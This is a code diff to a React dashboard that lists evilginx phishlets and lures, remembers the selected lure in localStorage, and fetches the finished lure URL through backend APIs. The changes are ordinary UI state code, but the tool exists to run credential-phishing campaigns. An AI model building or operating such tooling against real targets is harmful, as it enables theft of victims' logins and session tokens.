@@ -200,6 +200,9 @@ export default function Dashboard() {
   const fetchFullLink = useCallback(async () => {
     return withLoading(async () => {
       try {
+        // Get saved lure ID from localStorage if it exists
+        const savedLureId = localStorage.getItem("selectedLureId");
+
         // Also fetch all available lures
         const [linkResponse, luresResponse] = await Promise.all([
           fetch(
@@ -221,9 +224,23 @@ export default function Dashboard() {
           const luresData = await luresResponse.json();
           setLures(luresData.lures || []);
 
-          // Select the first lure by default if none is selected
-          if (luresData.lures && luresData.lures.length > 0 && !selectedLure) {
-            setSelectedLure(luresData.lures[0]);
+          // If we have lures
+          if (luresData.lures && luresData.lures.length > 0) {
+            // If we have a saved lure ID, try to find it
+            if (savedLureId) {
+              const savedLure = luresData.lures.find(
+                (lure) => lure.id === savedLureId
+              );
+              if (savedLure) {
+                setSelectedLure(savedLure);
+                return;
+              }
+            }
+
+            // If no selected lure and no saved ID (or saved ID not found), don't auto-select
+            if (!selectedLure) {
+              setSelectedLure(null);
+            }
           }
         }
       } catch (error) {
@@ -319,9 +336,22 @@ export default function Dashboard() {
     });
   };
 
-  const handleLureChange = async (lureIndex: number) => {
+  const handleLureChange = async (lureIndexStr: string) => {
+    // If "Select link" is chosen (value -1), clear the selected lure
+    if (lureIndexStr === "-1") {
+      setSelectedLure(null);
+      localStorage.removeItem("selectedLureId");
+      return;
+    }
+
+    const lureIndex = Number(lureIndexStr);
     const selectedLure = lures[lureIndex];
     setSelectedLure(selectedLure);
+
+    // Save the selected lure ID to localStorage
+    if (selectedLure && selectedLure.id) {
+      localStorage.setItem("selectedLureId", selectedLure.id);
+    }
 
     // Get the exact URL by calling the evilginx command through our API
     try {
@@ -548,41 +578,36 @@ export default function Dashboard() {
         // Update selected lure
         setSelectedLure(selected);
 
-        // If lureIndex is provided directly from the event, use it
-        const index =
-          typeof lureIndex === "number"
-            ? lureIndex
-            : lures.findIndex((lure) => lure.id === lureId);
+        // Save selected lure ID to localStorage
+        localStorage.setItem("selectedLureId", lureId);
 
-        if (index >= 0) {
-          // Get the exact URL by calling the evilginx command through our API
-          fetch(`/api/lure-url?lureIndex=${index}`)
-            .then((response) => {
-              if (response.ok) return response.json();
-              // If the lure-url API fails, fall back to the full-link API
-              throw new Error("Failed to fetch from lure-url API");
-            })
-            .then((data) => {
-              if (data.url) {
-                setFullLink(data.url);
-              }
-            })
-            .catch((error) => {
-              console.error("Error using lure-url API:", error);
-              // Fall back to the full-link API
-              fetch(`/api/full-link?lureId=${lureId}`)
-                .then((response) => {
-                  if (response.ok) return response.json();
-                  throw new Error("Failed to fetch link");
-                })
-                .then((data) => {
-                  setFullLink(data.fullUrl);
-                })
-                .catch((fallbackError) => {
-                  console.error("Error using fallback API:", fallbackError);
-                });
-            });
-        }
+        // Get the exact URL by calling the evilginx command through our API
+        fetch(`/api/lure-url?lureIndex=${lureIndex}`)
+          .then((response) => {
+            if (response.ok) return response.json();
+            // If the lure-url API fails, fall back to the full-link API
+            throw new Error("Failed to fetch from lure-url API");
+          })
+          .then((data) => {
+            if (data.url) {
+              setFullLink(data.url);
+            }
+          })
+          .catch((error) => {
+            console.error("Error using lure-url API:", error);
+            // Fall back to the full-link API
+            fetch(`/api/full-link?lureId=${lureId}`)
+              .then((response) => {
+                if (response.ok) return response.json();
+                throw new Error("Failed to fetch link");
+              })
+              .then((data) => {
+                setFullLink(data.fullUrl);
+              })
+              .catch((fallbackError) => {
+                console.error("Error using fallback API:", fallbackError);
+              });
+          });
       }
     };
 
@@ -748,9 +773,10 @@ export default function Dashboard() {
                 {lures.length > 0 ? (
                   <select
                     className="text-gray-200 bg-[#1B2028] border border-gray-700 rounded px-2 py-1 text-sm"
-                    value={lures.indexOf(selectedLure || lures[0])}
-                    onChange={(e) => handleLureChange(Number(e.target.value))}
+                    value={selectedLure ? lures.indexOf(selectedLure) : -1}
+                    onChange={(e) => handleLureChange(e.target.value)}
                   >
+                    <option value="-1">Select link</option>
                     {lures.map((lure, index) => (
                       <option key={index} value={index}>
                         {lure.phishlet} - {lure.path}
